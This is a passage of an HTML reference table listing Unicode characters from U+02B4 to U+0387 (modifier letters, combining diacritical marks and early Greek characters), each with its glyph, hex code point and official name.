<td style="text-align:center">MODIFIER LETTER SMALL R</td>
</tr>
<tr>
<td style="text-align:center">ʴ</td>
<td style="text-align:center">02B4</td>
<td style="text-align:center">MODIFIER LETTER SMALL TURNED R</td>
</tr>
<tr>
<td style="text-align:center">ʵ</td>
<td style="text-align:center">02B5</td>
<td style="text-align:center">MODIFIER LETTER SMALL TURNED R WITH HOOK</td>
</tr>
<tr>
<td style="text-align:center">ʶ</td>
<td style="text-align:center">02B6</td>
<td style="text-align:center">MODIFIER LETTER SMALL CAPITAL INVERTED R</td>
</tr>
<tr>
<td style="text-align:center">ʷ</td>
<td style="text-align:center">02B7</td>
<td style="text-align:center">MODIFIER LETTER SMALL W</td>
</tr>
<tr>
<td style="text-align:center">ʸ</td>
<td style="text-align:center">02B8</td>
<td style="text-align:center">MODIFIER LETTER SMALL Y</td>
</tr>
<tr>
<td style="text-align:center">ʹ</td>
<td style="text-align:center">02B9</td>
<td style="text-align:center">MODIFIER LETTER PRIME</td>
</tr>
<tr>
<td style="text-align:center">ʺ</td>
<td style="text-align:center">02BA</td>
<td style="text-align:center">MODIFIER LETTER DOUBLE PRIME</td>
</tr>
<tr>
<td style="text-align:center">ʻ</td>
<td style="text-align:center">02BB</td>
<td style="text-align:center">MODIFIER LETTER TURNED COMMA</td>
</tr>
<tr>
<td style="text-align:center">ʼ</td>
<td style="text-align:center">02BC</td>
<td style="text-align:center">MODIFIER LETTER APOSTROPHE</td>
</tr>
<tr>
<td style="text-align:center">ʽ</td>
<td style="text-align:center">02BD</td>
<td style="text-align:center">MODIFIER LETTER REVERSED COMMA</td>
</tr>
<tr>
<td style="text-align:center">ʾ</td>
<td style="text-align:center">02BE</td>
<td style="text-align:center">MODIFIER LETTER RIGHT HALF RING</td>
</tr>
<tr>
<td style="text-align:center">ʿ</td>
<td style="text-align:center">02BF</td>
<td style="text-align:center">MODIFIER LETTER LEFT HALF RING</td>
</tr>
<tr>
<td style="text-align:center">ˀ</td>
<td style="text-align:center">02C0</td>
<td style="text-align:center">MODIFIER LETTER GLOTTAL STOP</td>
</tr>
<tr>
<td style="text-align:center">ˁ</td>
<td style="text-align:center">02C1</td>
<td style="text-align:center">MODIFIER LETTER REVERSED GLOTTAL STOP</td>
</tr>
<tr>
<td style="text-align:center">˂</td>
<td style="text-align:center">02C2</td>
<td style="text-align:center">MODIFIER LETTER LEFT ARROWHEAD</td>
</tr>
<tr>
<td style="text-align:center">˃</td>
<td style="text-align:center">02C3</td>
<td style="text-align:center">MODIFIER LETTER RIGHT ARROWHEAD</td>
</tr>
<tr>
<td style="text-align:center">˄</td>
<td style="text-align:center">02C4</td>
<td style="text-align:center">MODIFIER LETTER UP ARROWHEAD</td>
</tr>
<tr>
<td style="text-align:center">˅</td>
<td style="text-align:center">02C5</td>
<td style="text-align:center">MODIFIER LETTER DOWN ARROWHEAD</td>
</tr>
<tr>
<td style="text-align:center">ˆ</td>
<td style="text-align:center">02C6</td>
<td style="text-align:center">MODIFIER LETTER CIRCUMFLEX ACCENT</td>
</tr>
<tr>
<td style="text-align:center">ˇ</td>
<td style="text-align:center">02C7</td>
<td style="text-align:center">CARON</td>
</tr>
<tr>
<td style="text-align:center">ˈ</td>
<td style="text-align:center">02C8</td>
<td style="text-align:center">MODIFIER LETTER VERTICAL LINE</td>
</tr>
<tr>
<td style="text-align:center">ˉ</td>
<td style="text-align:center">02C9</td>
<td style="text-align:center">MODIFIER LETTER MACRON</td>
</tr>
<tr>
<td style="text-align:center">ˊ</td>
<td style="text-align:center">02CA</td>
<td style="text-align:center">MODIFIER LETTER ACUTE ACCENT</td>
</tr>
<tr>
<td style="text-align:center">ˋ</td>
<td style="text-align:center">02CB</td>
<td style="text-align:center">MODIFIER LETTER GRAVE ACCENT</td>
</tr>
<tr>
<td style="text-align:center">ˌ</td>
<td style="text-align:center">02CC</td>
<td style="text-align:center">MODIFIER LETTER LOW VERTICAL LINE</td>
</tr>
<tr>
<td style="text-align:center">ˍ</td>
<td style="text-align:center">02CD</td>
<td style="text-align:center">MODIFIER LETTER LOW MACRON</td>
</tr>
<tr>
<td style="text-align:center">ˎ</td>
<td style="text-align:center">02CE</td>
<td style="text-align:center">MODIFIER LETTER LOW GRAVE ACCENT</td>
</tr>
<tr>
<td style="text-align:center">ˏ</td>
<td style="text-align:center">02CF</td>
<td style="text-align:center">MODIFIER LETTER LOW ACUTE ACCENT</td>
</tr>
<tr>
<td style="text-align:center">ː</td>
<td style="text-align:center">02D0</td>
<td style="text-align:center">MODIFIER LETTER TRIANGULAR COLON</td>
</tr>
<tr>
<td style="text-align:center">ˑ</td>
<td style="text-align:center">02D1</td>
<td style="text-align:center">MODIFIER LETTER HALF TRIANGULAR COLON</td>
</tr>
<tr>
<td style="text-align:center">˒</td>
<td style="text-align:center">02D2</td>
<td style="text-align:center">MODIFIER LETTER CENTRED RIGHT HALF RING</td>
</tr>
<tr>
<td style="text-align:center">˓</td>
<td style="text-align:center">02D3</td>
<td style="text-align:center">MODIFIER LETTER CENTRED LEFT HALF RING</td>
</tr>
<tr>
<td style="text-align:center">˔</td>
<td style="text-align:center">02D4</td>
<td style="text-align:center">MODIFIER LETTER UP TACK</td>
</tr>
<tr>
<td style="text-align:center">˕</td>
<td style="text-align:center">02D5</td>
<td style="text-align:center">MODIFIER LETTER DOWN TACK</td>
</tr>
<tr>
<td style="text-align:center">˖</td>
<td style="text-align:center">02D6</td>
<td style="text-align:center">MODIFIER LETTER PLUS SIGN</td>
</tr>
<tr>
<td style="text-align:center">˗</td>
<td style="text-align:center">02D7</td>
<td style="text-align:center">MODIFIER LETTER MINUS SIGN</td>
</tr>
<tr>
<td style="text-align:center">˘</td>
<td style="text-align:center">02D8</td>
<td style="text-align:center">BREVE</td>
</tr>
<tr>
<td style="text-align:center">˙</td>
<td style="text-align:center">02D9</td>
<td style="text-align:center">DOT ABOVE</td>
</tr>
<tr>
<td style="text-align:center">˚</td>
<td style="text-align:center">02DA</td>
<td style="text-align:center">RING ABOVE</td>
</tr>
<tr>
<td style="text-align:center">˛</td>
<td style="text-align:center">02DB</td>
<td style="text-align:center">OGONEK</td>
</tr>
<tr>
<td style="text-align:center">˜</td>
<td style="text-align:center">02DC</td>
<td style="text-align:center">SMALL TILDE</td>
</tr>
<tr>
<td style="text-align:center">˝</td>
<td style="text-align:center">02DD</td>
<td style="text-align:center">DOUBLE ACUTE ACCENT</td>
</tr>
<tr>
<td style="text-align:center">˞</td>
<td style="text-align:center">02DE</td>
<td style="text-align:center">MODIFIER LETTER RHOTIC HOOK</td>
</tr>
<tr>
<td style="text-align:center">˟</td>
<td style="text-align:center">02DF</td>
<td style="text-align:center">MODIFIER LETTER CROSS ACCENT</td>
</tr>
<tr>
<td style="text-align:center">ˠ</td>
<td style="text-align:center">02E0</td>
<td style="text-align:center">MODIFIER LETTER SMALL GAMMA</td>
</tr>
<tr>
<td style="text-align:center">ˡ</td>
<td style="text-align:center">02E1</td>
<td style="text-align:center">MODIFIER LETTER SMALL L</td>
</tr>
<tr>
<td style="text-align:center">ˢ</td>
<td style="text-align:center">02E2</td>
<td style="text-align:center">MODIFIER LETTER SMALL S</td>
</tr>
<tr>
<td style="text-align:center">ˣ</td>
<td style="text-align:center">02E3</td>
<td style="text-align:center">MODIFIER LETTER SMALL X</td>
</tr>
<tr>
<td style="text-align:center">ˤ</td>
<td style="text-align:center">02E4</td>
<td style="text-align:center">MODIFIER LETTER SMALL REVERSED GLOTTAL STOP</td>
</tr>
<tr>
<td style="text-align:center">˥</td>
<td style="text-align:center">02E5</td>
<td style="text-align:center">MODIFIER LETTER EXTRA-HIGH TONE BAR</td>
</tr>
<tr>
<td style="text-align:center">˦</td>
<td style="text-align:center">02E6</td>
<td style="text-align:center">MODIFIER LETTER HIGH TONE BAR</td>
</tr>
<tr>
<td style="text-align:center">˧</td>
<td style="text-align:center">02E7</td>
<td style="text-align:center">MODIFIER LETTER MID TONE BAR</td>
</tr>
<tr>
<td style="text-align:center">˨</td>
<td style="text-align:center">02E8</td>
<td style="text-align:center">MODIFIER LETTER LOW TONE BAR</td>
</tr>
<tr>
<td style="text-align:center">˩</td>
<td style="text-align:center">02E9</td>
<td style="text-align:center">MODIFIER LETTER EXTRA-LOW TONE BAR</td>
</tr>
<tr>
<td style="text-align:center">˪</td>
<td style="text-align:center">02EA</td>
<td style="text-align:center">MODIFIER LETTER YIN DEPARTING TONE MARK</td>
</tr>
<tr>
<td style="text-align:center">˫</td>
<td style="text-align:center">02EB</td>
<td style="text-align:center">MODIFIER LETTER YANG DEPARTING TONE MARK</td>
</tr>
<tr>
<td style="text-align:center">ˬ</td>
<td style="text-align:center">02EC</td>
<td style="text-align:center">MODIFIER LETTER VOICING</td>
</tr>
<tr>
<td style="text-align:center">˭</td>
<td style="text-align:center">02ED</td>
<td style="text-align:center">MODIFIER LETTER UNASPIRATED</td>
</tr>
<tr>
<td style="text-align:center">ˮ</td>
<td style="text-align:center">02EE</td>
<td style="text-align:center">MODIFIER LETTER DOUBLE APOSTROPHE</td>
</tr>
<tr>
<td style="text-align:center">˯</td>
<td style="text-align:center">02EF</td>
<td style="text-align:center">MODIFIER LETTER LOW DOWN ARROWHEAD</td>
</tr>
<tr>
<td style="text-align:center">˰</td>
<td style="text-align:center">02F0</td>
<td style="text-align:center">MODIFIER LETTER LOW UP ARROWHEAD</td>
</tr>
<tr>
<td style="text-align:center">˱</td>
<td style="text-align:center">02F1</td>
<td style="text-align:center">MODIFIER LETTER LOW LEFT ARROWHEAD</td>
</tr>
<tr>
<td style="text-align:center">˲</td>
<td style="text-align:center">02F2</td>
<td style="text-align:center">MODIFIER LETTER LOW RIGHT ARROWHEAD</td>
</tr>
<tr>
<td style="text-align:center">˳</td>
<td style="text-align:center">02F3</td>
<td style="text-align:center">MODIFIER LETTER LOW RING</td>
</tr>
<tr>
<td style="text-align:center">˴</td>
<td style="text-align:center">02F4</td>
<td style="text-align:center">MODIFIER LETTER MIDDLE GRAVE ACCENT</td>
</tr>
<tr>
<td style="text-align:center">˵</td>
<td style="text-align:center">02F5</td>
<td style="text-align:center">MODIFIER LETTER MIDDLE DOUBLE GRAVE ACCENT</td>
</tr>
<tr>
<td style="text-align:center">˶</td>
<td style="text-align:center">02F6</td>
<td style="text-align:center">MODIFIER LETTER MIDDLE DOUBLE ACUTE ACCENT</td>
</tr>
<tr>
<td style="text-align:center">˷</td>
<td style="text-align:center">02F7</td>
<td style="text-align:center">MODIFIER LETTER LOW TILDE</td>
</tr>
<tr>
<td style="text-align:center">˸</td>
<td style="text-align:center">02F8</td>
<td style="text-align:center">MODIFIER LETTER RAISED COLON</td>
</tr>
<tr>
<td style="text-align:center">˹</td>
<td style="text-align:center">02F9</td>
<td style="text-align:center">MODIFIER LETTER BEGIN HIGH TONE</td>
</tr>
<tr>
<td style="text-align:center">˺</td>
<td style="text-align:center">02FA</td>
<td style="text-align:center">MODIFIER LETTER END HIGH TONE</td>
</tr>
<tr>
<td style="text-align:center">˻</td>
<td style="text-align:center">02FB</td>
<td style="text-align:center">MODIFIER LETTER BEGIN LOW TONE</td>
</tr>
<tr>
<td style="text-align:center">˼</td>
<td style="text-align:center">02FC</td>
<td style="text-align:center">MODIFIER LETTER END LOW TONE</td>
</tr>
<tr>
<td style="text-align:center">˽</td>
<td style="text-align:center">02FD</td>
<td style="text-align:center">MODIFIER LETTER SHELF</td>
</tr>
<tr>
<td style="text-align:center">˾</td>
<td style="text-align:center">02FE</td>
<td style="text-align:center">MODIFIER LETTER OPEN SHELF</td>
</tr>
<tr>
<td style="text-align:center">˿</td>
<td style="text-align:center">02FF</td>
<td style="text-align:center">MODIFIER LETTER LOW LEFT ARROW</td>
</tr>
<tr>
<td style="text-align:center">ò</td>
<td style="text-align:center">0300</td>
<td style="text-align:center">GRAVE ACCENT</td>
</tr>
<tr>
<td style="text-align:center">ó</td>
<td style="text-align:center">0301</td>
<td style="text-align:center">ACUTE ACCENT</td>
</tr>
<tr>
<td style="text-align:center">ô</td>
<td style="text-align:center">0302</td>
<td style="text-align:center">CIRCUMFLEX ACCENT</td>
</tr>
<tr>
<td style="text-align:center">õ</td>
<td style="text-align:center">0303</td>
<td style="text-align:center">TILDE</td>
</tr>
<tr>
<td style="text-align:center">ō</td>
<td style="text-align:center">0304</td>
<td style="text-align:center">MACRON</td>
</tr>
<tr>
<td style="text-align:center">o̅</td>
<td style="text-align:center">0305</td>
<td style="text-align:center">OVERLINE</td>
</tr>
<tr>
<td style="text-align:center">ŏ</td>
<td style="text-align:center">0306</td>
<td style="text-align:center">BREVE</td>
</tr>
<tr>
<td style="text-align:center">ȯ</td>
<td style="text-align:center">0307</td>
<td style="text-align:center">DOT ABOVE</td>
</tr>
<tr>
<td style="text-align:center">ö</td>
<td style="text-align:center">0308</td>
<td style="text-align:center">DIAERESIS</td>
</tr>
<tr>
<td style="text-align:center">ỏ</td>
<td style="text-align:center">0309</td>
<td style="text-align:center">HOOK ABOVE</td>
</tr>
<tr>
<td style="text-align:center">o̊</td>
<td style="text-align:center">030A</td>
<td style="text-align:center">RING ABOVE</td>
</tr>
<tr>
<td style="text-align:center">ő</td>
<td style="text-align:center">030B</td>
<td style="text-align:center">DOUBLE ACUTE ACCENT</td>
</tr>
<tr>
<td style="text-align:center">ǒ</td>
<td style="text-align:center">030C</td>
<td style="text-align:center">CARON</td>
</tr>
<tr>
<td style="text-align:center">o̍</td>
<td style="text-align:center">030D</td>
<td style="text-align:center">VERTICAL LINE ABOVE</td>
</tr>
<tr>
<td style="text-align:center">o̎</td>
<td style="text-align:center">030E</td>
<td style="text-align:center">DOUBLE VERTICAL LINE ABOVE</td>
</tr>
<tr>
<td style="text-align:center">ȍ</td>
<td style="text-align:center">030F</td>
<td style="text-align:center">DOUBLE GRAVE ACCENT</td>
</tr>
<tr>
<td style="text-align:center">o̐</td>
<td style="text-align:center">0310</td>
<td style="text-align:center">CANDRABINDU</td>
</tr>
<tr>
<td style="text-align:center">ȏ</td>
<td style="text-align:center">0311</td>
<td style="text-align:center">INVERTED BREVE</td>
</tr>
<tr>
<td style="text-align:center">o̒</td>
<td style="text-align:center">0312</td>
<td style="text-align:center">TURNED COMMA ABOVE</td>
</tr>
<tr>
<td style="text-align:center">o̓</td>
<td style="text-align:center">0313</td>
<td style="text-align:center">COMMA ABOVE</td>
</tr>
<tr>
<td style="text-align:center">o̔</td>
<td style="text-align:center">0314</td>
<td style="text-align:center">REVERSED COMMA ABOVE</td>
</tr>
<tr>
<td style="text-align:center">o̕</td>
<td style="text-align:center">0315</td>
<td style="text-align:center">COMMA ABOVE RIGHT</td>
</tr>
<tr>
<td style="text-align:center">o̖</td>
<td style="text-align:center">0316</td>
<td style="text-align:center">GRAVE ACCENT BELOW</td>
</tr>
<tr>
<td style="text-align:center">o̗</td>
<td style="text-align:center">0317</td>
<td style="text-align:center">ACUTE ACCENT BELOW</td>
</tr>
<tr>
<td style="text-align:center">o̘</td>
<td style="text-align:center">0318</td>
<td style="text-align:center">LEFT TACK BELOW</td>
</tr>
<tr>
<td style="text-align:center">o̙</td>
<td style="text-align:center">0319</td>
<td style="text-align:center">RIGHT TACK BELOW</td>
</tr>
<tr>
<td style="text-align:center">o̚</td>
<td style="text-align:center">031A</td>
<td style="text-align:center">LEFT ANGLE ABOVE</td>
</tr>
<tr>
<td style="text-align:center">ơ</td>
<td style="text-align:center">031B</td>
<td style="text-align:center">HORN</td>
</tr>
<tr>
<td style="text-align:center">o̜</td>
<td style="text-align:center">031C</td>
<td style="text-align:center">LEFT HALF RING BELOW</td>
</tr>
<tr>
<td style="text-align:center">o̝</td>
<td style="text-align:center">031D</td>
<td style="text-align:center">UP TACK BELOW</td>
</tr>
<tr>
<td style="text-align:center">o̞</td>
<td style="text-align:center">031E</td>
<td style="text-align:center">DOWN TACK BELOW</td>
</tr>
<tr>
<td style="text-align:center">o̟</td>
<td style="text-align:center">031F</td>
<td style="text-align:center">PLUS SIGN BELOW</td>
</tr>
<tr>
<td style="text-align:center">o̠</td>
<td style="text-align:center">0320</td>
<td style="text-align:center">MINUS SIGN BELOW</td>
</tr>
<tr>
<td style="text-align:center">o̡</td>
<td style="text-align:center">0321</td>
<td style="text-align:center">PALATALIZED HOOK BELOW</td>
</tr>
<tr>
<td style="text-align:center">o̢</td>
<td style="text-align:center">0322</td>
<td style="text-align:center">RETROFLEX HOOK BELOW</td>
</tr>
<tr>
<td style="text-align:center">ọ</td>
<td style="text-align:center">0323</td>
<td style="text-align:center">DOT BELOW</td>
</tr>
<tr>
<td style="text-align:center">o̤</td>
<td style="text-align:center">0324</td>
<td style="text-align:center">DIAERESIS BELOW</td>
</tr>
<tr>
<td style="text-align:center">o̥</td>
<td style="text-align:center">0325</td>
<td style="text-align:center">RING BELOW</td>
</tr>
<tr>
<td style="text-align:center">o̦</td>
<td style="text-align:center">0326</td>
<td style="text-align:center">COMMA BELOW</td>
</tr>
<tr>
<td style="text-align:center">o̧</td>
<td style="text-align:center">0327</td>
<td style="text-align:center">CEDILLA</td>
</tr>
<tr>
<td style="text-align:center">ǫ</td>
<td style="text-align:center">0328</td>
<td style="text-align:center">OGONEK</td>
</tr>
<tr>
<td style="text-align:center">o̩</td>
<td style="text-align:center">0329</td>
<td style="text-align:center">VERTICAL LINE BELOW</td>
</tr>
<tr>
<td style="text-align:center">o̪</td>
<td style="text-align:center">032A</td>
<td style="text-align:center">BRIDGE BELOW</td>
</tr>
<tr>
<td style="text-align:center">o̫</td>
<td style="text-align:center">032B</td>
<td style="text-align:center">INVERTED DOUBLE ARCH BELOW</td>
</tr>
<tr>
<td style="text-align:center">o̬</td>
<td style="text-align:center">032C</td>
<td style="text-align:center">CARON BELOW</td>
</tr>
<tr>
<td style="text-align:center">o̭</td>
<td style="text-align:center">032D</td>
<td style="text-align:center">CIRCUMFLEX ACCENT BELOW</td>
</tr>
<tr>
<td style="text-align:center">o̮</td>
<td style="text-align:center">032E</td>
<td style="text-align:center">BREVE BELOW</td>
</tr>
<tr>
<td style="text-align:center">o̯</td>
<td style="text-align:center">032F</td>
<td style="text-align:center">INVERTED BREVE BELOW</td>
</tr>
<tr>
<td style="text-align:center">o̰</td>
<td style="text-align:center">0330</td>
<td style="text-align:center">TILDE BELOW</td>
</tr>
<tr>
<td style="text-align:center">o̱</td>
<td style="text-align:center">0331</td>
<td style="text-align:center">MACRON BELOW</td>
</tr>
<tr>
<td style="text-align:center">o̲</td>
<td style="text-align:center">0332</td>
<td style="text-align:center">LOW LINE</td>
</tr>
<tr>
<td style="text-align:center">o̳</td>
<td style="text-align:center">0333</td>
<td style="text-align:center">DOUBLE LOW LINE</td>
</tr>
<tr>
<td style="text-align:center">o̴</td>
<td style="text-align:center">0334</td>
<td style="text-align:center">TILDE OVERLAY</td>
</tr>
<tr>
<td style="text-align:center">o̵</td>
<td style="text-align:center">0335</td>
<td style="text-align:center">SHORT STROKE OVERLAY</td>
</tr>
<tr>
<td style="text-align:center">o̶</td>
<td style="text-align:center">0336</td>
<td style="text-align:center">LONG STROKE OVERLAY</td>
</tr>
<tr>
<td style="text-align:center">o̷</td>
<td style="text-align:center">0337</td>
<td style="text-align:center">SHORT SOLIDUS OVERLAY</td>
</tr>
<tr>
<td style="text-align:center">o̸</td>
<td style="text-align:center">0338</td>
<td style="text-align:center">LONG SOLIDUS OVERLAY</td>
</tr>
<tr>
<td style="text-align:center">o̹</td>
<td style="text-align:center">0339</td>
<td style="text-align:center">RIGHT HALF RING BELOW</td>
</tr>
<tr>
<td style="text-align:center">o̺</td>
<td style="text-align:center">033A</td>
<td style="text-align:center">INVERTED BRIDGE BELOW</td>
</tr>
<tr>
<td style="text-align:center">o̻</td>
<td style="text-align:center">033B</td>
<td style="text-align:center">SQUARE BELOW</td>
</tr>
<tr>
<td style="text-align:center">o̼</td>
<td style="text-align:center">033C</td>
<td style="text-align:center">SEAGULL BELOW</td>
</tr>
<tr>
<td style="text-align:center">o̽</td>
<td style="text-align:center">033D</td>
<td style="text-align:center">X ABOVE</td>
</tr>
<tr>
<td style="text-align:center">o̾</td>
<td style="text-align:center">033E</td>
<td style="text-align:center">VERTICAL TILDE</td>
</tr>
<tr>
<td style="text-align:center">o̿</td>
<td style="text-align:center">033F</td>
<td style="text-align:center">DOUBLE OVERLINE</td>
</tr>
<tr>
<td style="text-align:center">ò</td>
<td style="text-align:center">0340</td>
<td style="text-align:center">GRAVE TONE MARK</td>
</tr>
<tr>
<td style="text-align:center">ó</td>
<td style="text-align:center">0341</td>
<td style="text-align:center">ACUTE TONE MARK</td>
</tr>
<tr>
<td style="text-align:center">o͂</td>
<td style="text-align:center">0342</td>
<td style="text-align:center">GREEK PERISPOMENI (combined with theta)</td>
</tr>
<tr>
<td style="text-align:center">o̓</td>
<td style="text-align:center">0343</td>
<td style="text-align:center">GREEK KORONIS (combined with theta)</td>
</tr>
<tr>
<td style="text-align:center">ö́</td>
<td style="text-align:center">0344</td>
<td style="text-align:center">GREEK DIALYTIKA TONOS (combined with theta)</td>
</tr>
<tr>
<td style="text-align:center">oͅ</td>
<td style="text-align:center">0345</td>
<td style="text-align:center">GREEK YPOGEGRAMMENI (combined with theta)</td>
</tr>
<tr>
<td style="text-align:center">o͆</td>
<td style="text-align:center">0346</td>
<td style="text-align:center">BRIDGE ABOVE</td>
</tr>
<tr>
<td style="text-align:center">o͇</td>
<td style="text-align:center">0347</td>
<td style="text-align:center">EQUALS SIGN BELOW</td>
</tr>
<tr>
<td style="text-align:center">o͈</td>
<td style="text-align:center">0348</td>
<td style="text-align:center">DOUBLE VERTICAL LINE BELOW</td>
</tr>
<tr>
<td style="text-align:center">o͉</td>
<td style="text-align:center">0349</td>
<td style="text-align:center">LEFT ANGLE BELOW</td>
</tr>
<tr>
<td style="text-align:center">o͊</td>
<td style="text-align:center">034A</td>
<td style="text-align:center">NOT TILDE ABOVE</td>
</tr>
<tr>
<td style="text-align:center">o͋</td>
<td style="text-align:center">034B</td>
<td style="text-align:center">HOMOTHETIC ABOVE</td>
</tr>
<tr>
<td style="text-align:center">o͌</td>
<td style="text-align:center">034C</td>
<td style="text-align:center">ALMOST EQUAL TO ABOVE</td>
</tr>
<tr>
<td style="text-align:center">o͍</td>
<td style="text-align:center">034D</td>
<td style="text-align:center">LEFT RIGHT ARROW BELOW</td>
</tr>
<tr>
<td style="text-align:center">o͎</td>
<td style="text-align:center">034E</td>
<td style="text-align:center">UPWARDS ARROW BELOW</td>
</tr>
<tr>
<td style="text-align:center">o͏</td>
<td style="text-align:center">034F</td>
<td style="text-align:center">GRAPHEME JOINER</td>
</tr>
<tr>
<td style="text-align:center">o͐</td>
<td style="text-align:center">0350</td>
<td style="text-align:center">RIGHT ARROWHEAD ABOVE</td>
</tr>
<tr>
<td style="text-align:center">o͑</td>
<td style="text-align:center">0351</td>
<td style="text-align:center">LEFT HALF RING ABOVE</td>
</tr>
<tr>
<td style="text-align:center">o͒</td>
<td style="text-align:center">0352</td>
<td style="text-align:center">FERMATA</td>
</tr>
<tr>
<td style="text-align:center">o͓</td>
<td style="text-align:center">0353</td>
<td style="text-align:center">X BELOW</td>
</tr>
<tr>
<td style="text-align:center">o͔</td>
<td style="text-align:center">0354</td>
<td style="text-align:center">LEFT ARROWHEAD BELOW</td>
</tr>
<tr>
<td style="text-align:center">o͕</td>
<td style="text-align:center">0355</td>
<td style="text-align:center">RIGHT ARROWHEAD BELOW</td>
</tr>
<tr>
<td style="text-align:center">o͖</td>
<td style="text-align:center">0356</td>
<td style="text-align:center">RIGHT ARROWHEAD AND UP ARROWHEAD BELOW</td>
</tr>
<tr>
<td style="text-align:center">o͗</td>
<td style="text-align:center">0357</td>
<td style="text-align:center">RIGHT HALF RING ABOVE</td>
</tr>
<tr>
<td style="text-align:center">o͘</td>
<td style="text-align:center">0358</td>
<td style="text-align:center">DOT ABOVE RIGHT</td>
</tr>
<tr>
<td style="text-align:center">o͙</td>
<td style="text-align:center">0359</td>
<td style="text-align:center">ASTERISK BELOW</td>
</tr>
<tr>
<td style="text-align:center">o͚</td>
<td style="text-align:center">035A</td>
<td style="text-align:center">DOUBLE RING BELOW</td>
</tr>
<tr>
<td style="text-align:center">o͛</td>
<td style="text-align:center">035B</td>
<td style="text-align:center">ZIGZAG ABOVE</td>
</tr>
<tr>
<td style="text-align:center">͜o</td>
<td style="text-align:center">035C</td>
<td style="text-align:center">DOUBLE BREVE BELOW</td>
</tr>
<tr>
<td style="text-align:center">͝o</td>
<td style="text-align:center">035D</td>
<td style="text-align:center">DOUBLE BREVE</td>
</tr>
<tr>
<td style="text-align:center">͞o</td>
<td style="text-align:center">035E</td>
<td style="text-align:center">DOUBLE MACRON</td>
</tr>
<tr>
<td style="text-align:center">͟o</td>
<td style="text-align:center">035F</td>
<td style="text-align:center">DOUBLE MACRON BELOW</td>
</tr>
<tr>
<td style="text-align:center">͠o</td>
<td style="text-align:center">0360</td>
<td style="text-align:center">DOUBLE TILDE</td>
</tr>
<tr>
<td style="text-align:center">͡o</td>
<td style="text-align:center">0361</td>
<td style="text-align:center">DOUBLE INVERTED BREVE</td>
</tr>
<tr>
<td style="text-align:center">͢o</td>
<td style="text-align:center">0362</td>
<td style="text-align:center">DOUBLE RIGHTWARDS ARROW BELOW</td>
</tr>
<tr>
<td style="text-align:center">oͣ</td>
<td style="text-align:center">0363</td>
<td style="text-align:center">LATIN SMALL LETTER A</td>
</tr>
<tr>
<td style="text-align:center">oͤ</td>
<td style="text-align:center">0364</td>
<td style="text-align:center">LATIN SMALL LETTER E</td>
</tr>
<tr>
<td style="text-align:center">oͥ</td>
<td style="text-align:center">0365</td>
<td style="text-align:center">LATIN SMALL LETTER I</td>
</tr>
<tr>
<td style="text-align:center">oͦ</td>
<td style="text-align:center">0366</td>
<td style="text-align:center">LATIN SMALL LETTER O</td>
</tr>
<tr>
<td style="text-align:center">oͧ</td>
<td style="text-align:center">0367</td>
<td style="text-align:center">LATIN SMALL LETTER U</td>
</tr>
<tr>
<td style="text-align:center">oͨ</td>
<td style="text-align:center">0368</td>
<td style="text-align:center">LATIN SMALL LETTER C</td>
</tr>
<tr>
<td style="text-align:center">oͩ</td>
<td style="text-align:center">0369</td>
<td style="text-align:center">LATIN SMALL LETTER D</td>
</tr>
<tr>
<td style="text-align:center">oͪ</td>
<td style="text-align:center">036A</td>
<td style="text-align:center">LATIN SMALL LETTER H</td>
</tr>
<tr>
<td style="text-align:center">oͫ</td>
<td style="text-align:center">036B</td>
<td style="text-align:center">LATIN SMALL LETTER M</td>
</tr>
<tr>
<td style="text-align:center">oͬ</td>
<td style="text-align:center">036C</td>
<td style="text-align:center">LATIN SMALL LETTER R</td>
</tr>
<tr>
<td style="text-align:center">oͭ</td>
<td style="text-align:center">036D</td>
<td style="text-align:center">LATIN SMALL LETTER T</td>
</tr>
<tr>
<td style="text-align:center">oͮ</td>
<td style="text-align:center">036E</td>
<td style="text-align:center">LATIN SMALL LETTER V</td>
</tr>
<tr>
<td style="text-align:center">oͯ</td>
<td style="text-align:center">036F</td>
<td style="text-align:center">LATIN SMALL LETTER X</td>
</tr>
<tr>
<td style="text-align:center">Ͱ</td>
<td style="text-align:center">0370</td>
<td style="text-align:center">GREEK CAPITAL LETTER HETA</td>
</tr>
<tr>
<td style="text-align:center">ͱ</td>
<td style="text-align:center">0371</td>
<td style="text-align:center">GREEK SMALL LETTER HETA</td>
</tr>
<tr>
<td style="text-align:center">Ͳ</td>
<td style="text-align:center">0372</td>
<td style="text-align:center">GREEK CAPITAL LETTER ARCHAIC SAMPI</td>
</tr>
<tr>
<td style="text-align:center">ͳ</td>
<td style="text-align:center">0373</td>
<td style="text-align:center">GREEK SMALL LETTER ARCHAIC SAMPI</td>
</tr>
<tr>
<td style="text-align:center">ʹ</td>
<td style="text-align:center">0374</td>
<td style="text-align:center">GREEK NUMERAL SIGN</td>
</tr>
<tr>
<td style="text-align:center">͵</td>
<td style="text-align:center">0375</td>
<td style="text-align:center">GREEK LOWER NUMERAL SIGN</td>
</tr>
<tr>
<td style="text-align:center">Ͷ</td>
<td style="text-align:center">0376</td>
<td style="text-align:center">GREEK CAPITAL LETTER PAMPHYLIAN DIGAMMA</td>
</tr>
<tr>
<td style="text-align:center">ͷ</td>
<td style="text-align:center">0377</td>
<td style="text-align:center">GREEK SMALL LETTER PAMPHYLIAN DIGAMMA</td>
</tr>
<tr>
<td style="text-align:center">ͺ</td>
<td style="text-align:center">037A</td>
<td style="text-align:center">GREEK YPOGEGRAMMENI</td>
</tr>
<tr>
<td style="text-align:center">ͻ</td>
<td style="text-align:center">037B</td>
<td style="text-align:center">GREEK SMALL REVERSED LUNATE SIGMA SYMBOL</td>
</tr>
<tr>
<td style="text-align:center">ͼ</td>
<td style="text-align:center">037C</td>
<td style="text-align:center">GREEK SMALL DOTTED LUNATE SIGMA SYMBOL</td>
</tr>
<tr>
<td style="text-align:center">ͽ</td>
<td style="text-align:center">037D</td>
<td style="text-align:center">GREEK SMALL REVERSED DOTTED LUNATE SIGMA SYMBOL</td>
</tr>
<tr>
<td style="text-align:center">;</td>
<td style="text-align:center">037E</td>
<td style="text-align:center">GREEK QUESTION MARK</td>
</tr>
<tr>
<td style="text-align:center">΄</td>
<td style="text-align:center">0384</td>
<td style="text-align:center">GREEK TONOS</td>
</tr>
<tr>
<td style="text-align:center">΅</td>
<td style="text-align:center">0385</td>
<td style="text-align:center">GREEK DIALYTIKA TONOS</td>
</tr>
<tr>
<td style="text-align:center">Ά</td>
<td style="text-align:center">0386</td>
<td style="text-align:center">GREEK CAPITAL LETTER ALPHA WITH TONOS</td>
</tr>
<tr>
<td style="text-align:center">·</td>
<td style="text-align:center">0387</td>
<td style="text-align:center">GREEK ANO TELEIA</td>
</tr>
<tr>
